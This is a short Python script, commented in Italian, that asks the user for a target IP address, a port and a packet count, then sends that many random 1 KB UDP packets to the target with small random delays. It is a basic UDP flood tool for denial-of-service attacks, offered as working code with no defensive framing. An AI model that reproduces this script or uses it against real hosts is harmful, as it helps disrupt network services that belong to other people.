import socket
import random
import time

# Richiesta dei dati all'utente
target_ip = input("Inserisci l'IP del target: ")
target_port = int(input("Inserisci la porta del target: "))
num_packets = int(input("Quanti pacchetti da 1KB vuoi inviare?: "))

# Creiamo un socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generazione pacchetto da 1 KB (1024 byte)
packet = random._urandom(1024)

print(f"\n[INFO] Invio di {num_packets} pacchetti UDP a {target_ip}:{target_port}...")

# Ciclo per inviare i pacchetti
for i in range(num_packets):
   # Invia pacchetto
   sock.sendto(packet, (target_ip, target_port))

   # Ritardo casuale tra 0 e 0.1 secondi
   delay = random.uniform(0, 0.1)
   time.sleep(delay)

   print(f"Pacchetto {i+1}/{num_packets} inviato (ritardo: {delay:.3f} sec)")

print("\n[COMPLETATO] Invio pacchetti terminato!")